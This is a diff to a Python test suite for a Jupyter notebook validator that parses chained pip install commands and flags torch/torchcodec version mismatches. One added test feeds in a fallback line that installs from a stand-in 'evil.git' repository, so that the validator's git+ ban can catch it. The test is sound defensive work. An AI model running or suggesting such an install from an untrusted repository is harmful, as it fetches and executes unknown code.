@@ -454,7 +454,7 @@ def test_notebook_validator_splits_chained_shell_commands():
 
     # A `;` inside a PEP 508 marker is one argument, not a separator.
     marked = "!pip install \"torch==2.12.0; python_version >= '3.10'\""
-    assert nv._split_chained(marked) == [marked]
+    assert nv._split_chained(marked) == [(marked, False)]
     assert len(nv.rule_inst_004_torchcodec_torch(marked, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
 
@@ -495,17 +495,17 @@ def test_notebook_validator_stops_at_a_shell_comment():
     nv = _load_notebook_validator_module()
 
     cell = '!pip install "torch==2.12.0" # keep codec; pip install "torchcodec==0.13.0"'
-    assert nv._split_chained(cell) == ['!pip install "torch==2.12.0" ']
+    assert nv._split_chained(cell) == [('!pip install "torch==2.12.0" ', False)]
     assert len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
     # A control operator ends a word, so `;#` opens a comment with no space in front of it.
     tight = '!pip install "torch==2.12.0";# keep codec; pip install "torchcodec==0.13.0"'
-    assert nv._split_chained(tight) == ['!pip install "torch==2.12.0"']
+    assert nv._split_chained(tight) == [('!pip install "torch==2.12.0"', False)]
     assert len(nv.rule_inst_004_torchcodec_torch(tight, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
     # A `#` inside a word is not a comment: it is part of the argument.
     fragment = '!pip install "torchcodec==0.13.0#egg=x"'
-    assert nv._split_chained(fragment) == [fragment]
+    assert nv._split_chained(fragment) == [(fragment, False)]
 
 
 def test_notebook_validator_resumes_after_an_or_list():
@@ -516,9 +516,10 @@ def test_notebook_validator_resumes_after_an_or_list():
     assert nv._split_chained(
         "!pip install a && pip install b || pip install c ; pip install d"
     ) == [
-        "!pip install a ",
-        "!pip install b",
-        "!pip install d",
+        ("!pip install a ", False),
+        ("!pip install b", False),
+        ("!pip install c", True),
+        ("!pip install d", False),
     ]
 
     cell = '!pip install "torchcodec==0.11.1" || echo failed; pip install "torch==2.12.0"'
@@ -531,7 +532,7 @@ def test_notebook_validator_respects_escaped_separators():
     nv = _load_notebook_validator_module()
 
     escaped = "!pip install torch==2.12.0\;\\ python_version\\ \\>\\=\\ \\'3.10\\'"
-    assert nv._split_chained(escaped) == [escaped]
+    assert nv._split_chained(escaped) == [(escaped, False)]
     assert [inv.packages for inv in nv.iter_pip_invocations(escaped)] == [
         ["torch==2.12.0; python_version >= '3.10'"]
     ]
@@ -568,8 +569,9 @@ def test_notebook_validator_resumes_after_an_and_following_an_or():
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!pip install a || pip install b && pip install c") == [
-        "!pip install a ",
-        "!pip install c",
+        ("!pip install a ", False),
+        ("!pip install b", True),
+        ("!pip install c", False),
     ]
 
     cell = '!pip install "torchcodec==0.11.1" || echo failed && pip install "torch==2.12.0"'
@@ -639,6 +641,44 @@ def test_notebook_validator_replays_exclusions():
     assert len(nv.rule_inst_004_torchcodec_torch(narrow, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
 
+def test_notebook_validator_keeps_or_fallbacks_visible_to_other_rules():
+    """The fallback still runs when the left side fails, so dropping it from
+    iter_pip_invocations hid it from R-INST-001's git+ ban. Only the version replay skips it."""
+    nv = _load_notebook_validator_module()
+
+    cell = "!pip install foo || pip install git+https://example.com/evil.git"
+    assert [inv.conditional for inv in nv.iter_pip_invocations(cell)] == [False, True]
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0))
+
+    # The replay still ignores it, so the fallback codec is not reported as installed.
+    fallback = (
+        '!pip install "torchcodec==0.13.0" || pip install "torchcodec==0.11.1"\n'
+        '!pip install "torch==2.12.0"'
+    )
+    assert nv.rule_inst_004_torchcodec_torch(fallback, COLAB_TORCH211, "nb.ipynb", 0) == []
+
+
+def test_notebook_validator_will_not_name_an_exclusive_floor():
+    """`>V` names the one version pip will not install, so on its own it says the install
+    moved but not where. Only a ceiling that pins the minor can answer that."""
+    nv = _load_notebook_validator_module()
+
+    for cell in ('!pip install "torch>2.12"', '!pip install "torch>2.11.999"'):
+        assert nv._effective_version(cell, "torch", "2.11.0+cu128") is None, cell
+        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell
+
+    # `>=` still names its endpoint, which is what the earlier rounds rest on.
+    assert nv._effective_version('!pip install "torch>=2.12"', "torch", "2.11.0+cu128") == "2.12"
+    assert (
+        len(
+            nv.rule_inst_004_torchcodec_torch(
+                '!pip install "torch>=2.12"', COLAB_TORCH211, "nb.ipynb", 0
+            )
+        )
+        == 1
+    )
+
+
 def test_notebook_validator_reads_a_range_as_one_window():
     """A `>=X,<Y` pair is the same constraint as `~=X`, and the guard's own remedy is
     spelled that way (`pip install 'torchcodec>=0.11,<0.12.0'`), so the rule has to read it
@@ -665,21 +705,6 @@ def test_notebook_validator_reads_a_range_as_one_window():
     capped = '!pip install "torch==2.12.0" "torchcodec>=0.12"\n!pip install "torchcodec<=0.11"'
     assert len(nv.rule_inst_004_torchcodec_torch(capped, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
-    # `>` is a floor like `>=`: it only shifts the minor when the window spans two.
-    assert (
-        len(
-            nv.rule_inst_004_torchcodec_torch(
-                '!pip install "torch>2.12"', COLAB_TORCH211, "nb.ipynb", 0
-            )
-        )
-        == 1
-    )
-    assert (
-        nv.rule_inst_004_torchcodec_torch(
-            '!pip install "torch>2.11.999"', COLAB_TORCH211, "nb.ipynb", 0
-        )
-        == []
-    )
 
 
 def test_notebook_validator_reads_the_compatible_release_ceiling():
